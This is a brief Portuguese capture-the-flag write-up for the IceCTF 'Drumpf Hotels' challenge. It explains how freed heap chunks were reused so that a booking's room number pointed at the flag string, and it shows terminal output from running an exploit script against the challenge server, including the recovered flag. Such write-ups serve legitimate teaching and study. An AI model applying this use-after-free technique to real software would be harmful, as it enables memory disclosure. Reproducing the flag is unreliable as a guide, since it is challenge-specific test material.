# Drumpf Hotels

O desafio consistia em explorar uma falha de heap overflow, batemos bastante a cabeça com este desafio pois achavamos se tratar de uma falha double free() porém era bem mais simples, tinhamos que gravar 2  chunks usando as funçoes room e suite e então remover ambos e adicionar uma nova room, com o numero representado em decimal do endereço de memoria da string da flag lida já no começo de main() no campo numerico. e então chamar a função do programa print booking, já que esta função leria o inicio do chunk para exibir o numero da room.

```
greyhound//deadcow ~/fun/icectf/drumpf % ./xpl.py| nc drumpf.vuln.icec.tf 6502
...
2. Book a room
3. Delete booking
4. Print booking
5. Quit
$$$ 4
IceCTF{they_can_take_our_overflows_but_they_will_never_take_our_use_after_freeeedom!}
t�S�g���t�ORooms number: 134905
Name: DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
Rooms number: 134514237
...
greyhound//deadcow ~/fun/icectf/drumpf %
```
